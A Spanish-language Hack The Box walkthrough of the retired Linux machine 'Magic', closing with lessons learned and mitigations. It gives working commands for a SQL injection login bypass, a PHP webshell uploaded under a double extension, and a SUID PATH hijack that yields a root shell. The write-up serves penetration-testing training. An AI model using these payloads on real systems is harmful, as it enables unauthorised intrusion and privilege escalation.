---
machine: Magic
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, sqli, file-upload, suid, path-hijack]
---

# Magic — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El login es vulnerable a una SQLi que permite entrar como administrador. La subida valida la extensión de forma laxa y acepta un archivo `.php.jpg` que Apache interpreta como PHP. La base entrega la contraseña de `theseus`; un binario SUID que llama a `popen` sin ruta absoluta se explota con un PATH hijack.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- Puertos: `22/tcp` SSH y `80/tcp` HTTP.
- Servicios: Apache con PHP, MySQL y un binario SUID local.
- Tecnologías: PHP, MySQL, Apache, SUID, PATH hijack.

## Enumeración

- `magic.htb` con galería y login.
- Formulario de subida de imágenes.
- `db.php` con credenciales de MySQL.
- Usuario del sistema `theseus`.

## Foothold

Se bypassa el login con `admin' or 1=1-- -` y se sube un PHP disfrazado de imagen. La doble extensión `.php.jpg` evade el filtro y Apache ejecuta el archivo en la ruta de subida.

```bash
curl -s -c cookies.txt -d "username=admin' or 1=1-- -&password=x" http://magic.htb/login.php
printf '<?php system($_GET["c"]); ?>' > shell.php.jpg
curl -s -b cookies.txt -F "image=@shell.php.jpg" http://magic.htb/upload.php
curl "http://magic.htb/images/shell.php.jpg?c=id"
```

## Movimiento lateral

La webshell permite leer `db.php`; la contraseña de MySQL se reutiliza para el usuario `theseus`, que tiene SSH.

## Escalada de privilegios

Un binario SUID ejecuta `popen("cat ...")` sin ruta absoluta. Se coloca un `cat` malicioso en `/tmp`, se antepone `/tmp` al PATH y se invoca el binario para obtener una shell de root.

```bash
find / -perm -4000 -type f 2>/dev/null
strings /bin/magic
printf '#!/bin/sh\n/bin/sh\n' > /tmp/cat && chmod +x /tmp/cat
export PATH=/tmp:$PATH
/bin/magic
```

## Evidencia

- Login administrativo tras la SQLi.
- Webshell ejecutando comandos en la ruta de subida.
- Binario SUID y shell de root tras el PATH hijack.

## Lecciones aprendidas

- Las listas negras de extensiones no cubren todos los handlers.
- Una SQLi en el login puede dar acceso administrativo sin crackear nada.
- Los binarios SUID deben usar rutas absolutas y un entorno limpio.

## Mitigación y detección

- Usar consultas parametrizadas y listas blancas de extensiones.
- Servir las subidas sin ejecución y validar contenido real.
- Corregir el binario para usar rutas absolutas y sanitizar el PATH.

## Referencias

- [0xdf — Magic](https://0xdf.gitlab.io/2020/08/22/htb-magic.html)
- [IppSec — Magic](https://www.youtube.com/watch?v=bLIcew9Iot8)
- [Hack The Box — Magic](https://app.hackthebox.com/machines/magic)
